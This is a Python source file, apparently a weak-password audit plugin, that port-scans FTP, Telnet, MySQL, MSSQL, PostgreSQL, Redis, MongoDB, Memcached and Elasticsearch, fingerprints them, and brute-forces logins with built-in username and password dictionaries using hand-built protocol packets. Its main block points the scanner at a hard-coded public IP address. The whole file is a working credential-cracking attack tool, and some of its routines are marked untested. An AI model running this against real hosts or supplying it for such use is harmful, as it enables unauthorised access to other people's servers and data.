#!/usr/bin/env python
# -*- coding: utf-8 -*-
# author:wolf@YSRC


import math
import socket
import urllib.request
import time
import re
import ftplib
import hashlib
import struct
import binascii
import telnetlib

TIMEOUT = 10
I = 0
USER_DIC = {
    "ftp": ['www', 'admin', 'root', 'db', 'wwwroot', 'data', 'web', 'ftp'],
    "mysql": ['root'],
    "mssql": ['sa'],
    "telnet": ['administrator', 'admin', 'root', 'cisco'],
    "postgresql": ['postgres', 'admin'],
    "redis": ['null'],
    "mongodb": ['null'],
    "memcached": ['null'],
    "elasticsearch": ['null']
}
PASSWORD_DIC = [
    '123456', 'admin', 'root', 'password', '123123', '123', '1', '{user}', '{user}{user}', '{user}1',
    '{user}123', '{user}2016', '{user}2015', '{user}!', '', 'P@ssw0rd!!', 'qwa123', '12345678', 'test',
    '123qwe!@#', '123456789', '123321', '1314520', '666666', 'woaini', 'fuckyou', '000000', '1234567890',
    '8888888', 'qwerty', '1qaz2wsx', 'abc123', 'abc123456', '1q2w3e4r', '123qwe', '159357', 'p@ssw0rd',
    'p@55w0rd', 'password!', 'p@ssw0rd!', 'password1', 'r00t', 'tomcat', 'apache', 'system'
]
REGEX = [
    ['ftp', '21', b'^220.*?ftp|^220-|^220 Service|^220 FileZilla'],
    ['telnet', '23', b'^\\xff[\\xfa-\\xfe]|^\\x54\\x65\\x6c|Telnet'],
    ['mssql', '1433', b''],
    ['mysql', '3306', b'^.\\0\\0\\0.*?mysql|^.\\0\\0\\0\\n|.*?MariaDB server'],
    ['postgresql', '5432', b''],
    ['redis', '6379', b'-ERR|^\\$\\d+\\r\\nredis_version'],
    ['elasticsearch', '9200', b''],
    ['memcached', '11211', b'^ERROR'],
    ['mongodb', '27017', b'']
]


def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((str(host), int(port)))
    except:
        return False
    try:
        data = sock.recv(512)
        if len(data) > 2:
            return data
        else:
            sock.send('a\n\n')
            data = sock.recv(512)
            sock.close()
            if len(data) > 2:
                return data
            else:
                return 'NULL'
    except:
        sock.close()
        return 'NULL'


def server_discern(host, port, data):
    for mark_info in REGEX:
        try:
            name, default_port, reg = mark_info
            if reg and data != 'NULL':
                matchObj = re.search(reg, data, re.I | re.M)
                if matchObj:
                    return name
            elif int(default_port) == int(port):
                return name
        except:
            continue


class Crack():
    def __init__(self, ip, port, server, timeout):
        self.ip = ip
        self.port = port
        self.server = server
        self.timeout = timeout

    def run(self):
        user_list = USER_DIC[self.server]
        for user in user_list:
            for pass_ in PASSWORD_DIC:
                pass_ = str(pass_.replace('{user}', user))
                k = getattr(self, self.server)
                result = k(user, pass_)
                if result:
                    return result

    def ftp(self, user, pass_):
        try:
            ftp = ftplib.FTP()
            ftp.connect(self.ip, self.port)
            ftp.login(user, pass_)
            if user == 'ftp':
                return "anonymous"
            return "username:%s,password:%s" % (user, pass_)
        except:
            pass

    def mysql(self, user, pass_):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.ip, int(self.port)))
        packet = sock.recv(254)
        plugin, scramble = self.get_scramble(packet)
        if not scramble:
            return 3
        auth_data = self.get_auth_data(user, pass_, scramble, plugin)
        sock.send(auth_data)
        result = sock.recv(1024)
        if result == b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00":
            return "username:%s,password:%s" % (user, pass_)

    def postgresql(self, user, pass_):  # author:hos@YSRC
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, int(self.port)))
            packet_length = len(user) + 7 + len(
                "\x03user  database postgres application_name psql client_encoding UTF8  ")
            p = "%c%c%c%c%c\x03%c%cuser%c%s%cdatabase%cpostgres%capplication_name%cpsql%cclient_encoding%cUTF8%c%c" % (
                0, 0, 0, packet_length, 0, 0, 0, 0, user, 0, 0, 0, 0, 0, 0, 0, 0)
            sock.send(p.encode())
            packet = sock.recv(1024)
            psql_salt = []
            if bytes([packet[0]]) == b'R':
                a = str([packet[4]])
                # b = int(a[4:6], 16)
                authentication_type = str([bytes([packet[8]])])
                c = authentication_type[5:7]
                if int(c) == 5:
                    psql_salt = packet[9:]
            else:
                return 3
            buf = []
            salt = psql_salt
            lmd5 = self.make_response(buf, user.encode(), pass_.encode(), salt)
            packet_length1 = len(lmd5) + 5 + len('p')
            pp = 'p%c%c%c%c%s%c' % (0, 0, 0, packet_length1 - 1, lmd5, 0)
            sock.send(pp.encode())
            packet1 = sock.recv(1024)
            if bytes([packet1[0]]) == b"R":
                return "username:%s,password:%s" % (user, pass_)
        except:
            return 3

    def redis(self, user, pass_):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, int(self.port)))
            s.send(b"INFO\r\n")
            result = s.recv(1024)
            if b"redis_version" in result:
                return "unauthorized"
            elif b"Authentication" in result:
                for pass_ in PASSWORD_DIC:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((self.ip, int(self.port)))
                    s.send(b"AUTH %s\r\n" % (pass_))
                    result = s.recv(1024)
                    if b'+OK' in result:
                        return "username:%s,password:%s" % (user, pass_)
        except:
            return 3
    # 暂未测试
    def mssql(self, user, pass_):  # author:hos@YSRC
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.ip, self.port))
            hh = binascii.b2a_hex(self.ip)
            husername = binascii.b2a_hex(user)
            lusername = len(user)
            lpassword = len(pass_)
            ladd = len(self.ip) + len(str(self.port)) + 1
            hladd = hex(ladd).replace('0x', '')
            hpwd = binascii.b2a_hex(pass_)
            pp = binascii.b2a_hex(str(self.port))
            address = hh + '3a' + pp
            hhost = binascii.b2a_hex(self.ip)
            data = "0200020000000000123456789000000000000000000000000000000000000000000000000000ZZ5440000000000000000000000000000000000000000000000000000000000X3360000000000000000000000000000000000000000000000000000000000Y373933340000000000000000000000000000000000000000000000000000040301060a09010000000002000000000070796d7373716c000000000000000000000000000000000000000000000007123456789000000000000000000000000000000000000000000000000000ZZ3360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000Y0402000044422d4c6962726172790a00000000000d1175735f656e676c69736800000000000000000000000000000201004c000000000000000000000a000000000000000000000000000069736f5f31000000000000000000000000000000000000000000000000000501353132000000030000000000000000"
            data1 = data.replace(data[16:16 + len(address)], address)
            data2 = data1.replace(data1[78:78 + len(husername)], husername)
            data3 = data2.replace(data2[140:140 + len(hpwd)], hpwd)
            if lusername >= 16:
                data4 = data3.replace('0X', str(hex(lusername)).replace('0x', ''))
            else:
                data4 = data3.replace('X', str(hex(lusername)).replace('0x', ''))
            if lpassword >= 16:
                data5 = data4.replace('0Y', str(hex(lpassword)).replace('0x', ''))
            else:
                data5 = data4.replace('Y', str(hex(lpassword)).replace('0x', ''))
            hladd = hex(ladd).replace('0x', '')
            data6 = data5.replace('ZZ', str(hladd))
            data7 = binascii.a2b_hex(data6)
            sock.send(data7)
            packet = sock.recv(1024)
            if 'master' in packet:
                return "username:%s,password:%s" % (user, pass_)
        except:
            return 3

    def mongodb(self, user, pass_):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.ip, int(self.port)))
            data = binascii.a2b_hex(
                b"3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000")
            s.send(data)
            result = s.recv(1024)
            if b"ismaster" in result:
                getlog_data = binascii.a2b_hex(
                    b"480000000200000000000000d40700000000000061646d696e2e24636d6400000000000100000021000000026765744c6f670010000000737461727475705761726e696e67730000")
                s.send(getlog_data)
                result = s.recv(1024)
                if b"totalLinesWritten" in result:
                    return "unauthorized"
                else:
                    return 3
        except:
            return 3
    #暂未测试
    def memcached(self, user, pass_):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, int(self.port)))
        s.send(b"stats\r\n")
        result = s.recv(1024)
        if b"version" in result:
            return "unauthorized"

    def elasticsearch(self, user, pass_):
        url = "http://" + self.ip + ":" + str(self.port) + "/_cat"
        data = urllib.request.urlopen(url).read()
        if '/_cat/master' in data:
            return "unauthorized"
        else:
            return 3
    # telnet暂未测试
    def telnet(self, user, pass_):
        try:
            tn = telnetlib.Telnet(self.ip, self.port, self.timeout)
            # tn.set_debuglevel(3)
            time.sleep(0.5)
            os = tn.read_some()
        except:
            return 3
        user_match = "(?i)(login|user|username)"
        pass_match = '(?i)(password|pass)'
        login_match = '#|\$|>'
        if re.search(user_match, os):
            try:
                tn.write(str(user) + '\r\n')
                tn.read_until(pass_match, timeout=2)
                tn.write(str(pass_) + '\r\n')
                login_info = tn.read_until(login_match, timeout=3)
                tn.close()
                if re.search(login_match, login_info):
                    return "username:%s,password:%s" % (user, pass_)
            except:
                pass
        else:
            try:
                info = tn.read_until(user_match, timeout=2)
            except:
                return 3
            if re.search(user_match, info):
                try:
                    tn.write(str(user) + '\r\n')
                    tn.read_until(pass_match, timeout=2)
                    tn.write(str(pass_) + '\r\n')
                    login_info = tn.read_until(login_match, timeout=3)
                    tn.close()
                    if re.search(login_match, login_info):
                        return "username:%s,password:%s" % (user, pass_)
                except:
                    return 3
            elif re.search(pass_match, info):
                tn.read_until(pass_match, timeout=2)
                tn.write(str(pass_) + '\r\n')
                login_info = tn.read_until(login_match, timeout=3)
                tn.close()
                if re.search(login_match, login_info):
                    return "password:%s" % (pass_)

    def get_hash(self, password, scramble):
        hash_stage1 = hashlib.sha1(password.encode()).digest()
        hash_stage2 = hashlib.sha1(hash_stage1).digest()
        to = hashlib.sha1(scramble + hash_stage2).digest()
        reply = [h1 ^ h3 for (h1, h3) in zip(hash_stage1, to)]
        hash = struct.pack(b'20B', *reply)
        return hash

    def get_scramble(self, packet):
        scramble, plugin = '', ''
        try:
            tmp = packet[15:]
            m = re.findall(b"\x00?([\x01-\x7F]{7,})\x00", tmp)
            if len(m) > 3:
                del m[0]
            scramble = m[0] + m[1]
        except:
            return '', ''
        try:
            plugin = m[2]
        except:
            pass
        return plugin, scramble

    def get_auth_data(self, user, password, scramble, plugin):
        user_hex = binascii.b2a_hex(user.encode())
        pass_hex = binascii.b2a_hex(self.get_hash(password, scramble))
        data = b"85a23f0000000040080000000000000000000000000000000000000000000000" + user_hex + b"0014" + pass_hex
        if plugin:
            data += binascii.b2a_hex(
                plugin) + b"0055035f6f73076f737831302e380c5f636c69656e745f6e616d65086c69626d7973716c045f7069640539323330360f5f636c69656e745f76657273696f6e06352e362e3231095f706c6174666f726d067838365f3634"
        len_hex = hex(math.trunc(len(data) / 2)).replace("0x", "")
        auth_data = bytes(len_hex.encode()) + b"000001" + data
        # auth_data = len_hex + "000001" + str(data)
        return binascii.a2b_hex(auth_data)

    def make_response(self, buf, username, password, salt):
        pu = hashlib.md5(password + username).hexdigest()
        buf = hashlib.md5(pu.encode() + salt).hexdigest()
        return 'md5' + buf


def pass_crack(server_type, host, port):
    m = Crack(host, port, server_type, TIMEOUT)
    return m.run()


def poc(ip):
    if '://' in str(ip):
        ip = ip.split('//')[1]
    port = '21,23,1433,3306,5432,6379,9200,11211,27017'
    # port = [5432]
    socket.setdefaulttimeout(TIMEOUT)
    task_host = ip
    results = []
    for task_port in port.split(","):
    # for task_port in port:
        data = scan_port(task_host, task_port)
        if data:
            server_name = server_discern(task_host, task_port, data)
            if server_name:
                results.append("目标 IP %s:%s 开放了 %s 服务" % (task_host, task_port, server_name))
                # try:
                result = pass_crack(server_name, task_host, task_port)
                # except:
                #     result = False
                if result and result != 3:
                    log = "发现目标IP %s:%d 存在%s弱口令 %s" % (task_host, int(task_port), server_name, result)
                    results.append(log)
    if results:
        # print(results)
        return results


if __name__ == "__main__":
    a = poc('209.188.24.190')
    print(a)
